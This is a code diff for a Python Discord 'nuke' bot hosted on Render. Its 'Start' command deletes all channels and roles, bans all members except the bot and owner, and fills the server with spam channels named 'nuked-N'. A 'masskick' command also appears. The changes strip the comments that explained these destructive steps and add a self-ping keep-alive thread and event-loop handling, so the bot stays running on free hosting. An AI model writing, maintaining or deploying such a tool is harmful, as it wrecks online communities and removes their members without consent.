@@ -5,6 +5,7 @@
 
 import os
 import threading
+import asyncio
 import discord
 from discord.ext import commands
 from flask import Flask
@@ -23,7 +24,7 @@ app = Flask(__name__)
 
 @bot.event
 async def on_ready():
-    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
+    print(f"Logged in as {bot.user} (ID: {bot.user.id})", flush=True)
 
 @bot.command(name="Start")
 @commands.has_permissions(administrator=True)
@@ -34,14 +35,12 @@ async def start(ctx):
     except Exception:
         pass
 
-    # Delete all existing channels
     for channel in list(guild.channels):
         try:
             await channel.delete()
         except Exception:
             pass
 
-    # Delete all roles except @everyone and managed roles
     for role in list(guild.roles):
         if role.name != "@everyone" and not role.managed:
             try:
@@ -49,7 +48,6 @@ async def start(ctx):
             except Exception:
                 pass
 
-    # Ban all members except bot and owner
     for member in list(guild.members):
         if member != guild.me and member != guild.owner:
             try:
@@ -57,7 +55,6 @@ async def start(ctx):
             except Exception:
                 pass
 
-    # Create 40 channels and spam each
     for i in range(CHANNEL_COUNT):
         try:
             ch = await guild.create_text_channel(f"nuked-{i}")
@@ -130,7 +127,28 @@ async def masskick(ctx):
                 pass
 
 def run_bot():
-    bot.run(TOKEN)
+    # Create a fresh event loop for the bot thread.
+    # Required on Render because the main thread may not have a usable loop.
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    try:
+        bot.run(TOKEN)
+    except Exception as e:
+        print(f"BOT ERROR: {e}", flush=True)
+
+def keep_alive():
+    # Self-ping to prevent Render free tier from sleeping.
+    import urllib.request
+    import time
+    url = os.environ.get("RENDER_EXTERNAL_URL")
+    if not url:
+        return
+    while True:
+        time.sleep(600)
+        try:
+            urllib.request.urlopen(url)
+        except Exception:
+            pass
 
 @app.route("/")
 def index():
@@ -141,10 +159,12 @@ def health():
     return "OK", 200
 
 if __name__ == "__main__":
-    # Start Discord bot in a background thread
-    t = threading.Thread(target=run_bot, daemon=True)
-    t.start()
+    # Start Discord bot in a background thread with its own event loop
+    threading.Thread(target=run_bot, daemon=True).start()
+
+    # Start self-ping thread
+    threading.Thread(target=keep_alive, daemon=True).start()
 
     # Start Flask web server (Render provides PORT env var)
     port = int(os.environ.get("PORT", 8080))
-    app.run(host="0.0.0.0", port=port)
+    app.run(host="0.0.0.0", port=port, threaded=True)
